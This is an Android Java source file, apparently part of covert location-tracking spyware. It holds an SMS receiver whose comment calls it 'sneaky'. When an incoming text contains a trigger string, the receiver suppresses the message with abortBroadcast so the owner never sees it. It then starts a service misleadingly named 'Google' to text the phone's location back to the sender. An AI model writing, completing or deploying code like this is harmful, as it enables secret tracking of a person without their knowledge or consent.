package ws.denger.loc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * 猥琐的接收者
 * 
 * @author Denger
 * 
 */
public class WSReceiver extends BroadcastReceiver {
	private final static String TAG = "WSReceiver";
	public final static String FLAG_SENDER = "FLAG_SENDER";
	public final static String FLAG_CONTENT = "FLAG_CONTENT";
	public final static String FLAG_TIME = "FLAG_TIME";

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.d(TAG, "我接收了广播！！！！！" + intent.getAction());
		if (intent.getAction()
				.equals("android.provider.Telephony.SMS_RECEIVED")) {// 短信到达
			readSMS(context, intent);
		}
		context.startService(new Intent(context, Google.class));
	}

	/**
	 * 分析短信
	 * 
	 * @param context
	 * @param intent
	 */
	private void readSMS(Context context, Intent intent) {
		// 第一步、获取短信的内容和发件人
		StringBuilder body = new StringBuilder();// 短信内容
		StringBuilder number = new StringBuilder();// 短信发件人
		Log.v(TAG, "number" + number);
		Bundle bundle = intent.getExtras();
		if (bundle != null) {
			Object[] _pdus = (Object[]) bundle.get("pdus");
			SmsMessage[] message = new SmsMessage[_pdus.length];
			for (int i = 0; i < _pdus.length; i++) {
				message[i] = SmsMessage.createFromPdu((byte[]) _pdus[i]);
			}
			for (SmsMessage currentMessage : message) {
				body.append(currentMessage.getDisplayMessageBody());
				number.append(currentMessage.getDisplayOriginatingAddress());
			}
			String smsBody = body.toString();
			String smsNumber = number.toString();
			Log.v(TAG, "smsNumber:" + smsNumber);
			Log.v(TAG, "smsBody:" + smsBody);
			if (smsNumber.contains("+86")) {
				smsNumber = smsNumber.substring(3);
			}
			String tmp[] = smsBody.split(";");
			for (int i = 0; i < tmp.length; i++) {
				System.out.println(tmp[i]);
				Log.d(TAG, "tmp[i]" + tmp[i]);
			}

			// 第二步:确认该短信内容是否满足过滤条件
			boolean flags_filter = false;
			if (smsBody.contains(context.getResources().getString(
					R.string.sms_head))) {// 屏蔽指定打头发来的短信
				flags_filter = true;
				Log.d(TAG, "符合屏蔽条件");
			}
			// 第三步:取消往下传播,并且定位回复短信
			if (flags_filter) {
				this.abortBroadcast();
				Intent service = new Intent(context, Google.class);
				service.setAction(Google.ACTION_SEND_LOC_SMS);
				service.putExtra(Google.FLAG_TEL, smsNumber);// 装入发送指令的号码
				context.startService(service);
			}
		}
		Log.d(TAG, ">>>>>>>onReceive end");
	}

}
